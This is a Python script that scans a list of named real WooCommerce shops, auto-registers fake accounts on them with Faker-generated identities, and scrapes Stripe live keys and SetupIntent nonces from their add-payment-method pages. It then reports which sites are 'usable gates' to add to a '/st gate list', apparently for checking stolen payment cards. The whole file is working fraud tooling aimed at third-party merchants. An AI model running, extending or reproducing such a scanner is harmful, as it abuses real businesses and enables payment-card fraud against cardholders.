"""
Test WooCommerce Stripe SetupIntent sites scan flow.
Find WC+Stripe sites and verify SetupIntent nonce extraction works.
"""
import asyncio, sys, re, random
sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import aiohttp
from aiohttp import ClientTimeout, CookieJar
from faker import Faker

faker = Faker()

TIMEOUT = ClientTimeout(total=20)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
}

# Known WC+Stripe sites to test against
TEST_SITES = [
    "https://ea-courses.com",
    "https://dilaboards.com",
    "https://learnclarity.com",
    "https://onlinelabels.com",
    "https://courses.therisingtide.co",
    "https://store.wpmanageninja.com",
    "https://skincarebysania.com",
    "https://gracefulartscoliving.com",
]

PATH_CANDIDATES = [
    {"add": "/my-account/add-payment-method/", "post": "/my-account/"},
    {"add": "/my-account/payment-methods/",    "post": "/my-account/"},
]

async def test_site(site_url: str) -> dict:
    result = {"url": site_url, "ok": False, "reason": "", "pk": "", "nonce": ""}

    jar = CookieJar(unsafe=True)
    try:
        async with aiohttp.ClientSession(cookie_jar=jar) as s:
            # Step 1: find the add-payment-method page with pk_live_
            html_1 = ""
            active_path = None
            for paths in PATH_CANDIDATES:
                url = site_url.rstrip("/") + paths["add"]
                try:
                    async with s.get(url, headers=HEADERS, ssl=False, timeout=TIMEOUT, allow_redirects=True) as r:
                        if r.status == 200:
                            txt = await r.text(errors="ignore")
                            if "pk_live_" in txt:
                                html_1 = txt
                                active_path = paths
                                break
                except Exception:
                    pass

            if not active_path:
                result["reason"] = "pk_live_ not found on add-payment-method page"
                return result

            # Extract PK
            pk_m = re.search(r'(pk_live_[a-zA-Z0-9]{24,})', html_1)
            result["pk"] = pk_m.group(1)[:20] + "..." if pk_m else "?"

            # Step 2: register account
            reg_m = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html_1)
            if reg_m:
                fake_user = faker.user_name()[:10] + str(random.randint(100, 999))
                data = {
                    "email":                       faker.email(),
                    "username":                    fake_user,
                    "woocommerce-register-nonce":  reg_m.group(1),
                    "register":                    "Register",
                }
                post_url = site_url.rstrip("/") + active_path["post"]
                try:
                    async with s.post(post_url, headers=HEADERS, data=data, ssl=False, timeout=TIMEOUT) as r:
                        pass
                except Exception:
                    pass

                # Re-fetch add-payment-method as logged-in user
                try:
                    add_url = site_url.rstrip("/") + active_path["add"]
                    async with s.get(add_url, headers=HEADERS, ssl=False, timeout=TIMEOUT) as r:
                        if r.status == 200:
                            html_1 = await r.text(errors="ignore")
                except Exception:
                    pass

            # Step 3: extract SetupIntent nonce
            nonce_patterns = [
                r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
                r'"setupIntentNonce"\s*:\s*"([^"]+)"',
                r'"stripe_setup_nonce"\s*:\s*"([^"]+)"',
                r'"_ajax_nonce"\s*:\s*"([a-f0-9]{10,})"',
                r'"nonce"\s*:\s*"([a-f0-9]{10,})"',
            ]
            nonce = None
            for pat in nonce_patterns:
                m = re.search(pat, html_1)
                if m:
                    nonce = m.group(1)
                    break

            result["nonce"] = nonce[:12] + "..." if nonce else None

            if nonce:
                result["ok"] = True
                result["reason"] = "SetupIntent nonce found — GATE USABLE"
            else:
                result["reason"] = "Nonce not found (registration may have failed or site incompatible)"

    except Exception as e:
        result["reason"] = f"Error: {type(e).__name__}: {str(e)[:50]}"

    return result


async def main():
    print("=" * 65)
    print("  WooCommerce + Stripe SetupIntent Site Scanner — TEST")
    print("=" * 65)
    print()

    tasks = [test_site(url) for url in TEST_SITES]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    working = []
    for r in results:
        if isinstance(r, Exception):
            print(f"  ERR | {r}")
            continue
        status = "WORKING" if r["ok"] else "FAILED"
        icon   = "✓" if r["ok"] else "✗"
        print(f"  {icon} {status:7s} | {r['url']}")
        if r["ok"]:
            print(f"           PK    : {r['pk']}")
            print(f"           Nonce : {r['nonce']}")
            working.append(r["url"])
        else:
            print(f"           Reason: {r['reason']}")
        print()

    print(f"{'=' * 65}")
    print(f"  Working WC+Stripe gates: {len(working)}/{len(TEST_SITES)}")
    if working:
        print("  These can be added to /st gate list:")
        for u in working:
            print(f"    → {u}")

asyncio.run(main())
